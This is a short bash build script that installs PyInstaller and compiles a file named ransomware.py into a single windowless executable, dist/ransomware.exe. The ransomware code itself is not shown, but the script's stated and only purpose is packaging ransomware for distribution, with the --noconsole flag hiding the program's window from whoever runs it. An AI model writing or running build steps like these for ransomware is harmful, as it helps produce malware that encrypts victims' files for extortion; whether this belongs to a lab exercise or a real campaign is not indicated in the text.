#!/bin/bash
echo "Building ransomware executable..."
echo ""

# Install PyInstaller if needed
pip install pyinstaller --break-system-packages

# Build the executable
# pyinstaller --onefile --noconsole ransomware.py

python3 -m PyInstaller --onefile --noconsole ransomware.py

echo ""
echo "Done! Executable is in: dist/ransomware.exe"
echo ""
